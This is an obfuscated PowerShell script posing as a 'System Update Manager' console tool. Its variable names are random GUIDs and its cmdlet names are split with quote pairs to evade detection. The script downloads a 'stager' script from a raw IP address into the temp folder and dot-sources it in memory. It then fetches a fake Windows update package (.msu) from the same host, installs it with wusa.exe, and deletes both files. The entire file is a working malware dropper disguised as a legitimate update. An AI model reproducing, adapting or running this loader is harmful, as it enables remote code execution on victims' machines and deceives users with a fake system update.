$92b643a750b04d9188874335ade00c47 = 'http://151.61.206.201/stager.txt'
$ccbafbf6eba64b7295cfd9ff53c18d8a    = 'http://151.61.206.201/update_k897867.msu'

# ============================================================
# Utility: progress bar in console
# ============================================================
function Show-DownloadProgress {
    param(
        [string]$FileName,
        [long]$BytesReceived,
        [long]$TotalBytes
    )
    if ($TotalBytes -gt 0) {
        $d985a1eb843d4386ba8e9f2ec2c95e57    = [int](($BytesReceived / $TotalBytes) * 100)
        $4b0a2bb3f7d84a3bbba1db2fc8a10b8e = [int]($d985a1eb843d4386ba8e9f2ec2c95e57 / 5)
        $5d0e2ecfc7bb4e4a93dac3e701e33eaf    = ('#' * $4b0a2bb3f7d84a3bbba1db2fc8a10b8e).PadRight(20)
        W''r''it''e-''H''o''s''t "`r    Downloading: [$5d0e2ecfc7bb4e4a93dac3e701e33eaf] $d985a1eb843d4386ba8e9f2ec2c95e57%  ($([math]::Round($BytesReceived/1KB,1)) KB / $([math]::Round($TotalBytes/1KB,1)) KB)" -NoNewline
    } else {
        W''ri''te-''Host "`r    Downloading: $([math]::Round($BytesReceived/1KB,1)) KB received (total size unknown)" -NoNewline
    }
}

# ============================================================
# Utility: download a file to %TEMP% with random name + ext
#          showing progress in console
# ============================================================
function Download-ToTemp {
    param(
        [string]$Url,
        [string]$Extension,
        [string]$Label
    )

    $e9ffd6054ee042878ec24b943d8265a0     = [System.Guid]::NewGuid().ToString('N').Substring(0, 8)
    $a9539a01a7684b50bd18addde67597d6 = "$env:TEMP\$e9ffd6054ee042878ec24b943d8265a0$Extension"

    W''r''i''t''e''-Host ''
    Wri''te-''H''o''s''t "  [*] Initiating download: $Label" -ForegroundColor Cyan
    W''r''i''t''e''-H''o''s''t "      Source : $Url"
    W''r''i''t''e''-''H''o''s''t "      Target : $a9539a01a7684b50bd18addde67597d6"
    Wri''t''e''-H''ost ''

    $f27f7d06026f4bc0ba3c545ce32de7ef = New-Ob''j''ec''t System.Net.WebClient
    $f27f7d06026f4bc0ba3c545ce32de7ef.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')

    $a180665684844dd0a9376566aacd5043 = R''e''g''is''t''er''-O''b''j''e''ctE''v''ent -InputObject $f27f7d06026f4bc0ba3c545ce32de7ef `
        -EventName DownloadProgressChanged `
        -Action {
            Show-DownloadProgress `
                -FileName      $Event.SourceArgs[1].UserState `
                -BytesReceived $Event.SourceArgs[1].BytesReceived `
                -TotalBytes    $Event.SourceArgs[1].TotalBytesToReceive
        }

    $319fbe27655b4751b1879971a5a146fd = R''e''g''i''s''t''e''r''-''O''b''j''e''c''t''E''v''e''n''t -InputObject $f27f7d06026f4bc0ba3c545ce32de7ef `
        -EventName DownloadFileCompleted `
        -Action { $global:DownloadDone = $true }

    $global:DownloadDone = $false
    $f27f7d06026f4bc0ba3c545ce32de7ef.DownloadFileAsync([uri]$Url, $a9539a01a7684b50bd18addde67597d6)

    while (-not $global:DownloadDone) { Sta''rt-S''l''e''ep -Milliseconds 100 }

    Unr''e''g''i''st''e''r''-''E''vent -SourceIdentifier $a180665684844dd0a9376566aacd5043.Name -ErrorAction SilentlyContinue
    U''nregister-Eve''nt -SourceIdentifier $319fbe27655b4751b1879971a5a146fd.Name -ErrorAction SilentlyContinue
    R''e''m''o''v''e''-''Job -Name $a180665684844dd0a9376566aacd5043.Name -ErrorAction SilentlyContinue
    R''e''m''o''ve-''J''ob -Name $319fbe27655b4751b1879971a5a146fd.Name -ErrorAction SilentlyContinue

    $9f4863cc5d7443c99fce7447294cadc5 = [math]::Round((Get-Item $a9539a01a7684b50bd18addde67597d6).Length / 1KB, 1)
    W''r''ite-Ho''st ''
    Wri''t''e''-Host "  [+] Download complete: $Label ($9f4863cc5d7443c99fce7447294cadc5 KB)" -ForegroundColor Green
    W''rit''e-Host ''

    return $a9539a01a7684b50bd18addde67597d6
}

# ============================================================
# Header
# ============================================================
W''r''i''t''e''-''H''o''s''t ''
Wr''i''t''e''-H''ost '================================================================' -ForegroundColor DarkCyan
W''r''i''t''e''-Ho''s''t '  System Update Manager'                                          -ForegroundColor DarkCyan
W''ri''t''e''-''H''o''s''t '  Initializing update sequence...'                                -ForegroundColor DarkCyan
W''r''i''t''e''-''H''o''st '================================================================' -ForegroundColor DarkCyan
W''r''i''te''-''H''o''s''t ''
Wri''t''e-''H''ost "  Timestamp : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
W''ri''t''e''-''H''o''s''t "  Host      : $env:COMPUTERNAME"
Wr''i''te-''H''o''s''t "  User      : $env:USERNAME"
W''r''i''te-''H''o''st ''

# ============================================================
# PHASE 1 — Download and execute PowerShell script
# ============================================================
W''r''it''e''-''H''o''s''t '----------------------------------------------------------------' -ForegroundColor DarkGray
Wr''i''te''-''H''o''s''t '  PHASE 1 of 2 — Script Component'                               -ForegroundColor Yellow
W''r''i''t''e''-''H''o''s''t '----------------------------------------------------------------' -ForegroundColor DarkGray

$97b9918e77c4442c960309bb31901f6a = $null
try {
    $a55caca812b445768ac3dd8bdae396b5 = [System.IO.Path]::GetFileName($92b643a750b04d9188874335ade00c47)
    $97b9918e77c4442c960309bb31901f6a  = Download-ToTemp -Url $92b643a750b04d9188874335ade00c47 -Extension '.ps1' -Label $a55caca812b445768ac3dd8bdae396b5

    if (-not (Test-Path $97b9918e77c4442c960309bb31901f6a)) {
        throw "Downloaded file not found at expected path: $97b9918e77c4442c960309bb31901f6a"
    }

    W''r''i''te''-''H''o''st "  [*] Executing script component: $a55caca812b445768ac3dd8bdae396b5" -ForegroundColor Cyan
    W''rit''e''-''Ho''st '      Method : in-process (dot-source)'
    Wr''ite-Host "      Path   : $97b9918e77c4442c960309bb31901f6a"
    W''r''it''e''-''H''o''s''t ''

    . $97b9918e77c4442c960309bb31901f6a

    Wr''it''e-Host '  [+] Script component executed successfully.' -ForegroundColor Green

} catch {
    Writ''e-Hos''t "  [!] PHASE 1 encountered an error: $_" -ForegroundColor Red
} finally {
    if ($97b9918e77c4442c960309bb31901f6a -and (Test-Path $97b9918e77c4442c960309bb31901f6a)) {
        W''r''i''te''-H''ost "  [*] Cleaning up temporary file: $97b9918e77c4442c960309bb31901f6a" -ForegroundColor DarkGray
        Re''m''ov''e-It''e''m $97b9918e77c4442c960309bb31901f6a -Force -ErrorAction SilentlyContinue
        W''r''i''t''e''-''Host '  [+] Temporary file removed.'                 -ForegroundColor DarkGray
    }
}

W''r''i''t''e-Ho''s''t ''

# ============================================================
# PHASE 2 — Download and execute MSU package
# ============================================================
Wri''te-H''os''t '----------------------------------------------------------------' -ForegroundColor DarkGray
W''rit''e-Ho''st '  PHASE 2 of 2 — Update Package Component'                       -ForegroundColor Yellow
Wr''i''t''e-''Ho''st '----------------------------------------------------------------' -ForegroundColor DarkGray

$5e981beeda574c89bac885ab9bd73819 = $null
try {
    $dad980d92f814ef2bb1606d8ce48c9be = [System.IO.Path]::GetFileName($ccbafbf6eba64b7295cfd9ff53c18d8a)
    $5e981beeda574c89bac885ab9bd73819  = Download-ToTemp -Url $ccbafbf6eba64b7295cfd9ff53c18d8a -Extension '.msu' -Label $dad980d92f814ef2bb1606d8ce48c9be

    if (-not (Test-Path $5e981beeda574c89bac885ab9bd73819)) {
        throw "Downloaded file not found at expected path: $5e981beeda574c89bac885ab9bd73819"
    }

    W''r''it''e''-''H''o''s''t "  [*] Executing update package: $dad980d92f814ef2bb1606d8ce48c9be"              -ForegroundColor Cyan
    W''r''i''te''-''H''o''s''t '      Installer : wusa.exe (Windows Update Standalone Installer)'
    Wr''it''e''-''Ho''s''t '      Mode      : synchronous (waiting for completion)'
    W''ri''t''e''-''H''o''s''t "      Path      : $5e981beeda574c89bac885ab9bd73819"
    W''r''i''te''-''H''os''t ''

    $fa250dcd0c9b47f6a79cc73a05f2aaf2 = S''t''ar''t''-''Pro''c''e''s''s `
        -FilePath    "$env:windir\System32\wusa.exe" `
        -ArgumentList "`"$5e981beeda574c89bac885ab9bd73819`"" `
        -Wait `
        -PassThru

    Wr''i''t''e''-''H''o''st "  [+] Update package installer exited with code: $($fa250dcd0c9b47f6a79cc73a05f2aaf2.ExitCode)" -ForegroundColor Green

} catch {
    W''r''i''t''e''-''H''o''s''t "  [!] PHASE 2 encountered an error: $_" -ForegroundColor Red
} finally {
    if ($5e981beeda574c89bac885ab9bd73819 -and (Test-Path $5e981beeda574c89bac885ab9bd73819)) {
        W''r''i''te''-H''o''s''t "  [*] Cleaning up temporary file: $5e981beeda574c89bac885ab9bd73819" -ForegroundColor DarkGray
        Remove''-Item $5e981beeda574c89bac885ab9bd73819 -Force -ErrorAction SilentlyContinue
        Wr''it''e''-Host '  [+] Temporary file removed.'               -ForegroundColor DarkGray
    }
}

# ============================================================
# Footer
# ============================================================
W''r''i''t''e''-''H''o''s''t ''
Wr''i''te''-H''ost '================================================================' -ForegroundColor DarkCyan
Wr''i''t''e-''H''o''st "  Update sequence completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor DarkCyan
W''r''i''t''e''-Ho''s''t '================================================================' -ForegroundColor DarkCyan
W''r''i''te''-H''o''s''t ''
